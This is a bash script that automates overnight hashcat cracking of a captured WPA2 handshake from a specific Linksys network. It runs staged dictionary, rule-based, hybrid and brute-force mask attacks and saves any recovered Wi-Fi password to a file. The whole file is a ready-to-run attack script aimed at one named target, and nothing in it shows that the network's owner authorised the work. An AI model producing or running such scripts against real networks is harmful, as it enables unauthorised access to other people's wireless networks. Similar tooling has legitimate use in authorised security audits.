#!/bin/bash
# Overnight WPA2 PSK Cracking Script — WSL2 Kali
# Target: Linksys03963 handshake
# Hash: ~/data/linksys.hc22000

export TERM=xterm
export COLUMNS=120
export LINES=40

HASH="$HOME/data/linksys.hc22000"
WORDLIST="$HOME/data/linksys_wifi_wordlist.txt"
ROCKYOU="$HOME/data/rockyou.txt"
LOG="$HOME/data/crack_log.txt"
RESULT="$HOME/data/CRACKED.txt"
HC_OPTS="--force --quiet"

echo "=== OVERNIGHT CRACK SESSION (WSL2) ===" > "$LOG"
echo "Started: $(date)" >> "$LOG"
echo "Hash: $HASH" >> "$LOG"
echo "Host: $(uname -n)" >> "$LOG"
echo "" >> "$LOG"

check_cracked() {
    local found=$(hashcat -m 22000 "$HASH" --show $HC_OPTS 2>/dev/null)
    if [ -n "$found" ]; then
        echo "" >> "$LOG"
        echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" >> "$LOG"
        echo "!!! PSK CRACKED !!!" >> "$LOG"
        echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" >> "$LOG"
        echo "$found" >> "$LOG"
        echo "Cracked at: $(date)" >> "$LOG"
        echo "$found" > "$RESULT"
        echo "CRACKED: $found"
        return 0
    fi
    return 1
}

run_attack() {
    local name="$1"
    shift
    echo "" >> "$LOG"
    echo "=== Attack: $name ===" >> "$LOG"
    echo "Start: $(date)" >> "$LOG"
    echo "Command: hashcat $@" >> "$LOG"

    hashcat "$@" $HC_OPTS 2>&1 | tail -25 >> "$LOG"
    local rc=$?

    echo "End: $(date), Exit: $rc" >> "$LOG"

    if check_cracked; then
        exit 0
    fi
}

# ==========================================
# PHASE A: Targeted dictionary attacks
# ==========================================

# A1: Linksys wordlist + dive.rule (heavy mutation)
run_attack "A1: dive.rule + linksys wordlist" \
    -m 22000 -a 0 "$HASH" "$WORDLIST" -r /usr/share/hashcat/rules/dive.rule

# A2: Linksys wordlist + d3ad0ne.rule
run_attack "A2: d3ad0ne.rule + linksys wordlist" \
    -m 22000 -a 0 "$HASH" "$WORDLIST" -r /usr/share/hashcat/rules/d3ad0ne.rule

# A3: Linksys wordlist + rockyou-30000.rule
run_attack "A3: rockyou-30000.rule + linksys wordlist" \
    -m 22000 -a 0 "$HASH" "$WORDLIST" -r /usr/share/hashcat/rules/rockyou-30000.rule

# A4: Hybrid - linksys wordlist + 4 digits appended
run_attack "A4: hybrid wordlist+4digits" \
    -m 22000 -a 6 "$HASH" "$WORDLIST" "?d?d?d?d"

# A5: Hybrid - 4 digits prepended + linksys wordlist
run_attack "A5: hybrid 4digits+wordlist" \
    -m 22000 -a 7 "$HASH" "?d?d?d?d" "$WORDLIST"

# ==========================================
# PHASE B: Mask/brute-force attacks
# ==========================================

# B1: 8-digit all-numeric (100M)
run_attack "B1: 8-digit numeric" \
    -m 22000 -a 3 "$HASH" "?d?d?d?d?d?d?d?d"

# B2: 9-digit all-numeric (1B)
run_attack "B2: 9-digit numeric" \
    -m 22000 -a 3 "$HASH" "?d?d?d?d?d?d?d?d?d"

# B3: 10-digit all-numeric (10B)
run_attack "B3: 10-digit numeric" \
    -m 22000 -a 3 "$HASH" "?d?d?d?d?d?d?d?d?d?d"

# B4: 8-char lowercase alpha (208B — this one takes hours)
run_attack "B4: 8-char lowercase" \
    -m 22000 -a 3 "$HASH" "?l?l?l?l?l?l?l?l"

# B5: 8-char lowercase+digits (2.8T — very long)
run_attack "B5: 8-char lower+digit" \
    -m 22000 -a 3 "$HASH" -1 "?l?d" "?1?1?1?1?1?1?1?1"

# ==========================================
# PHASE C: Full rockyou.txt with rules
# ==========================================

# C1: rockyou.txt straight (already done in Docker but re-running on bare metal)
run_attack "C1: rockyou.txt straight" \
    -m 22000 -a 0 "$HASH" "$ROCKYOU"

# C2: rockyou.txt + best66 rules
run_attack "C2: rockyou + best66.rule" \
    -m 22000 -a 0 "$HASH" "$ROCKYOU" -r /usr/share/hashcat/rules/best66.rule

# C3: rockyou.txt + dive.rule (massive — 14M x 99K rules)
run_attack "C3: rockyou + dive.rule" \
    -m 22000 -a 0 "$HASH" "$ROCKYOU" -r /usr/share/hashcat/rules/dive.rule

# ==========================================
# PHASE D: Mixed case and special patterns
# ==========================================

# D1: 8-char mixed case + digits
run_attack "D1: 8-char mixed+digit" \
    -m 22000 -a 3 "$HASH" -1 "?l?u?d" "?1?1?1?1?1?1?1?1"

# D2: 9-char lowercase+digits
run_attack "D2: 9-char lower+digit" \
    -m 22000 -a 3 "$HASH" -1 "?l?d" "?1?1?1?1?1?1?1?1?1"

# D3: 10-char lowercase+digits
run_attack "D3: 10-char lower+digit" \
    -m 22000 -a 3 "$HASH" -1 "?l?d" "?1?1?1?1?1?1?1?1?1?1"

# ==========================================
# DONE
# ==========================================

echo "" >> "$LOG"
echo "=== ALL ATTACKS COMPLETE ===" >> "$LOG"
echo "Finished: $(date)" >> "$LOG"
if ! check_cracked; then
    echo "PSK NOT FOUND in any attack phase." >> "$LOG"
    echo "NOT CRACKED" > "$RESULT"
fi
